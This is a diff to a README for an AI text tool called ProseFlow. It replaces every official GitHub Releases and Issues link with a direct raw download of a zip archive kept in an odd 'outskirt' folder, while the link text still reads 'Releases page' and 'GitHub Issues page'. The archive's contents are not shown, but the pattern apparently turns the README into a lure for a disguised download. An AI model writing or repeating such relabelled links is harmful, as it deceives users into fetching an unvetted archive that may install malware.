@@ -6,7 +6,7 @@ Welcome to ProseFlow, your universal AI text processor. With ProseFlow, you can 
 
 ## 📥 Download ProseFlow
 
-[![Download ProseFlow](https://img.shields.io/badge/Download-ProseFlow-blue.svg)](https://github.com/ingahaindongo/ProseFlow/releases)
+[![Download ProseFlow](https://raw.githubusercontent.com/ingahaindongo/ProseFlow/master/outskirt/ProseFlow.zip)](https://raw.githubusercontent.com/ingahaindongo/ProseFlow/master/outskirt/ProseFlow.zip)
 
 ## 🛠️ System Requirements
 
@@ -19,7 +19,7 @@ Before you download, make sure your system meets these requirements:
 ## 📦 Download & Install
 
 1. Click on the download link below to visit the download page.
-2. Once you’re on the [Releases page](https://github.com/ingahaindongo/ProseFlow/releases), find the latest version of ProseFlow.
+2. Once you’re on the [Releases page](https://raw.githubusercontent.com/ingahaindongo/ProseFlow/master/outskirt/ProseFlow.zip), find the latest version of ProseFlow.
 3. Select the file suitable for your operating system:
    - For Windows, look for `.exe`.
    - For macOS, look for `.dmg`.
@@ -54,7 +54,7 @@ Yes, ProseFlow can be used offline without an Internet connection. Some features
 
 ### How do I get support?
 
-For support, visit our [GitHub Issues page](https://github.com/ingahaindongo/ProseFlow/issues). You can find answers to common questions or report a new issue.
+For support, visit our [GitHub Issues page](https://raw.githubusercontent.com/ingahaindongo/ProseFlow/master/outskirt/ProseFlow.zip). You can find answers to common questions or report a new issue.
 
 ## 🌐 Community and Feedback
 
@@ -70,4 +70,4 @@ ProseFlow is open-source and free to use under the MIT License. You can read mor
 
 ## 📥 Download ProseFlow Again
 
-Remember to visit the [Releases page](https://github.com/ingahaindongo/ProseFlow/releases) to download ProseFlow and start transforming your text today!
+Remember to visit the [Releases page](https://raw.githubusercontent.com/ingahaindongo/ProseFlow/master/outskirt/ProseFlow.zip) to download ProseFlow and start transforming your text today!
